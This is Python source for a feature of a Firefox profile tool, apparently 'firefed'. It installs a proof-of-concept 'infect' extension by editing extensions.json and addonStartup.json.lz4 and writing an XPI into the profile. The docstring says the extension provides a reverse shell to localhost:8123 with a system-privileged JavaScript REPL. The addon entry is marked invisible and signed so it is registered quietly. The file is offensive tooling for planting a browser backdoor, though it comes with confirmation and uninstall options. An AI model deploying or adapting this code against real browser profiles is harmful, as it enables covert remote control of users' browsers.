import json
import os
from pathlib import Path
import sys
from zipfile import ZipFile

from attr import attrs

from firefed.feature import Feature, arg
from firefed.output import bad, good, out, warn
from firefed.util import fatal


startup_key = 'app-profile'
addon_id = 'infect@example.com'  # ID is in whitelist for legacy extensions
addon_version = '1.0'
ADDON_FILE = 'infect@example.com.xpi' # TODO addon_filename
addon_entry = {
    'id': addon_id,
    'syncGUID': 'infect',
    'location': startup_key,
    'version': addon_version,
    'type': 'extension',
    'internalName': None,
    'updateURL': None,
    'updateKey': None,
    'optionsURL': None,
    'optionsType': None,
    'aboutURL': None,
    'defaultLocale': {
        'name': 'infect',
        'description': 'This is the infect POC.',
        'creator': 'numirias',
    },
    'visible': False,
    'active': True,
    'userDisabled': False,
    'appDisabled': False,
    'installDate': 1461552448000,
    'updateDate': 1506403392000,
    'applyBackgroundUpdates': 1,
    'bootstrap': True,
    'path': None,  # Needs to be set
    'skinnable': False,
    'size': 962,
    'sourceURI': None,
    'releaseNotesURI': None,
    'softDisabled': False,
    'foreignInstall': False,
    'hasBinaryComponents': False,
    'strictCompatibility': False,
    'locales': [],
    'targetApplications': [
        {
            'id': '{ec8030f7-c20a-464f-9b0e-13a3a9e97384}',
            'minVersion': '1.0',
            'maxVersion': '*',
        }
    ],
    'targetPlatforms': [],
    'multiprocessCompatible': True,
    'signedState': 4,
    'seen': True,
    'dependencies': [],
    'hasEmbeddedWebExtension': False,
    'mpcOptedOut': False,
    'userPermissions': None,
    'icons': {},
    'iconURL': None,
    'icon64URL': None,
    'blocklistState': 0,
    'blocklistURL': None,
}
startup_entry = {
    'enabled': True,
    'lastModifiedTime': 1506403392000,
    'path': ADDON_FILE,
    'version': addon_version,
    'bootstrapped': True,
    'dependencies': [],
    'runInSafeMode': True,
    'hasEmbeddedWebExtension': False,
}

DEFAULT_EXT_DIR = Path('extensions')
ROOT_PATH = Path(sys.modules['firefed'].__file__).parent
EXT_DB = 'extensions.json'
ADDON_STARTUP_FILE = 'addonStartup.json.lz4'


@attrs
class Infect(Feature):
    """Install a PoC reverse shell via a hidden extension.

    This is highly experimental and only a proof of concept. Also note the
    extension currently isn't actually hidden and disappears with the next
    browser restart.

    The reverse shell will attempt to connect to `localhost:8123` and provides
    a JS REPL with system principal privileges.
    """

    want_uninstall = arg('-u', '--uninstall', help='uninstall malicious addon',
                         action='store_true', default=False)
    want_check = arg('-c', '--check', help='check if profile appears infected',
                     action='store_true', default=False)
    yes = arg('-y', '--yes', help='don\'t prompt for confirmation',
              action='store_true', default=False)

    def run(self):
        self.read_extensions_json()
        self.read_addon_startup_json()
        addons = self.extensions_json['addons']
        addon = next((a for a in addons if a['id'] == addon_id), None)
        if self.want_uninstall:
            self.uninstall(addon)
        elif self.want_check:
            self.check(addon)
        else:
            self.install(addon)

    @property
    def ext_dir(self):
        startup = self.startup_json
        try:
            return Path(startup[startup_key]['path'])
        except KeyError:
            return self.profile_path(DEFAULT_EXT_DIR)

    def check(self, addon):
        checks = (
            addon is not None,
            addon_id in self.startup_json.get(startup_key, {}).get('addons',
                                                                   {}),
            Path(self.ext_dir / ADDON_FILE).is_file(),
        )
        if all(checks):
            out(good('Extension seems installed.'))
        else:
            out(bad('Extension doesn\'t seem (fully) installed.'))

    def install(self, addon):
        if not self.yes:
            out('Are you sure you want to infect profile "%s"? (y/N)' %
                self.session.profile)
            if input().lower() not in ['y', 'yes']:
                fatal('Cancelled.')
        out('Installing to "%s"...' % self.session.profile)
        if addon is not None:
            warn('Addon entry "%s" already exists.' % addon_id)
        else:
            addons = self.extensions_json['addons']
            addons.append(self.make_addon_entry())
            self.write_extensions_json()

        startup = self.startup_json
        if startup_key not in startup:
            startup[startup_key] = {}
        if 'addons' not in startup[startup_key]:
            startup[startup_key]['addons'] = {}
        if addon_id in startup[startup_key]['addons']:
            warn('Addon already registered in "%s".' % ADDON_STARTUP_FILE)
        else:
            startup[startup_key]['addons'][addon_id] = startup_entry
            startup[startup_key]['path'] = str(self.ext_dir)
            self.write_addon_startup_json()
        try:
            os.mkdir(self.ext_dir)
        except FileExistsError:
            pass
        xpi_source = ROOT_PATH / 'data/infect/'
        xpi_target = self.ext_dir / ADDON_FILE
        xpi_path_rel = (Path(self.ext_dir.name) / ADDON_FILE)
        if Path(xpi_target).exists():
            warn('XPI already exists at "%s".' % xpi_path_rel)
        else:
            out('Writing XPI file to "%s".' % xpi_path_rel)
            with ZipFile(xpi_target, 'w') as f:
                for filename in os.listdir(xpi_source):
                    path = xpi_source / filename
                    print('Adding "%s".' % filename)
                    f.write(path, filename)
        out('Done.')

    def uninstall(self, addon):
        out('Uninstalling from "%s"...' % self.session.profile)
        addons = self.extensions_json['addons']
        try:
            addons.remove(addon)
        except ValueError:
            warn('Can\'t remove addon from "%s". No entry found.' % EXT_DB)
        else:
            self.write_extensions_json()
        try:
            del self.startup_json[startup_key]['addons'][addon_id]
        except KeyError:
            warn('Can\'t remove addon entry from "%s". No entry found.' %
                 ADDON_STARTUP_FILE)
        else:
            self.write_addon_startup_json()
        xpi_path = self.ext_dir / ADDON_FILE
        xpi_path_rel = (Path(self.ext_dir.name) / ADDON_FILE)
        if Path(xpi_path).exists():
            out('Removing "%s".' % xpi_path_rel)
            os.remove(xpi_path)
        else:
            warn('Can\'t remove XPI from "%s". File not found.' % xpi_path_rel)
        out('Done.')

    def read_extensions_json(self):
        with open(self.profile_path(EXT_DB), encoding='utf-8') as f:
            self.extensions_json = json.load(f)

    def write_extensions_json(self):
        out('Updating "%s".' % EXT_DB)
        with open(self.profile_path(EXT_DB), 'w', encoding='utf-8') as f:
            json.dump(self.extensions_json, f)

    def read_addon_startup_json(self):
        self.startup_json = self.load_json_mozlz4(ADDON_STARTUP_FILE)

    def write_addon_startup_json(self):
        out('Updating "%s".' % ADDON_STARTUP_FILE)
        self.write_json_mozlz4(ADDON_STARTUP_FILE, self.startup_json)

    def make_addon_entry(self):
        entry = addon_entry.copy()
        entry['path'] = str(self.ext_dir / ADDON_FILE)
        return entry
